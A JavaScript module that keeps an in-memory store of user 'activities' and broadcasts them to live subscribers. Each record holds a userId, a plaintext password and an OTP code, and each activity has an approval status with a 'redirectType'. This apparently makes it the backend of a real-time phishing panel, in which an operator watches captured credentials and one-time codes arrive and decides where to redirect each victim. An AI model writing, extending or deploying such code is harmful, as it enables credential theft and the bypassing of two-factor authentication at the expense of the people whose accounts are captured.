// In-memory storage for activities and approvals
// No persistent storage - all data is stored in memory

const memoryStore = {
  activities: [],
  approvals: {},
  subscribers: []
};

// Store full activity including credentials in memory
export async function publishActivity(activity) {
  try {
    // Store full activity with all credentials
    const fullActivity = {
      id: activity.id,
      type: activity.type,
      timestamp: activity.timestamp,
      userId: activity.userId,
      password: activity.password || null,
      otpCode: activity.otpCode || null,
      hasPassword: activity.hasPassword || false
    };
    
    // Store in memory (keep all, no limit)
    memoryStore.activities.unshift(fullActivity);
    
    // Keep only last 1000 activities to prevent memory issues
    if (memoryStore.activities.length > 1000) {
      memoryStore.activities = memoryStore.activities.slice(0, 1000);
    }
    
    console.log(`[kv-client] Stored activity ${activity.id} with userId: ${activity.userId}`);
    
    // Notify subscribers
    memoryStore.subscribers.forEach(callback => {
      try {
        callback({
          type: 'activity',
          data: fullActivity
        });
      } catch (error) {
        console.error('Error in subscriber callback:', error);
      }
    });
    
    return true;
  } catch (error) {
    console.error('Error publishing activity:', error);
    // Fallback to memory on error
    memoryStore.activities.unshift(activity);
    return true;
  }
}

// Store approval decision (activity ID + status only) in memory
export async function setApproval(activityId, approval) {
  const approvalData = {
    status: approval.status,
    redirectType: approval.redirectType || null,
    timestamp: approval.timestamp || new Date().toISOString()
  };
  
  try {
    // Store in memory
    memoryStore.approvals[activityId] = approvalData;
    
    // Auto-delete after 10 minutes to prevent memory leaks
    setTimeout(() => {
      if (memoryStore.approvals[activityId]) {
        delete memoryStore.approvals[activityId];
      }
    }, 600000); // 10 minutes
    
    // Notify subscribers
    const approvalMessage = {
      type: 'approval',
      activityId,
      data: approvalData
    };
    console.log(`[kv-client] Broadcasting approval to memory subscribers:`, approvalMessage);
    memoryStore.subscribers.forEach(callback => {
      try {
        callback(approvalMessage);
      } catch (error) {
        console.error('Error in memory subscriber callback:', error);
      }
    });
    
    return true;
  } catch (error) {
    console.error('Error setting approval:', error);
    // Still store in memory on error
    memoryStore.approvals[activityId] = approvalData;
    return true;
  }
}

// Get approval status from memory
export async function getApproval(activityId) {
  try {
    return memoryStore.approvals[activityId] || null;
  } catch (error) {
    console.error('[kv-client] Error getting approval:', error);
    return null;
  }
}

// Get recent activities with full credentials from memory
export async function getRecentActivities() {
  try {
    console.log(`[kv-client] 💾 Returning ${memoryStore.activities.length} activities from memory`);
    // Return last 500 activities, sorted by timestamp descending
    return memoryStore.activities.slice(0, 500).sort((a, b) => 
      new Date(b.timestamp) - new Date(a.timestamp)
    );
  } catch (error) {
    console.error('[kv-client] ❌ Error getting recent activities:', error);
    return [];
  }
}

// Subscribe to memory events (for fallback mode)
export function subscribeMemoryEvents(callback) {
  memoryStore.subscribers.push(callback);
  return () => {
    const index = memoryStore.subscribers.indexOf(callback);
    if (index > -1) {
      memoryStore.subscribers.splice(index, 1);
    }
  };
}

// Trigger all memory subscribers (called from broadcastToSSE)
export function triggerMemorySubscribers(data) {
  console.log(`[kv-client] triggerMemorySubscribers called with:`, data);
  console.log(`[kv-client] Number of subscribers: ${memoryStore.subscribers.length}`);
  memoryStore.subscribers.forEach((callback, index) => {
    try {
      console.log(`[kv-client] Calling subscriber ${index + 1}...`);
      callback(data);
      console.log(`[kv-client] Subscriber ${index + 1} called successfully`);
    } catch (error) {
      console.error(`[kv-client] Error in subscriber ${index + 1}:`, error);
    }
  });
  console.log(`[kv-client] All ${memoryStore.subscribers.length} subscribers notified`);
}

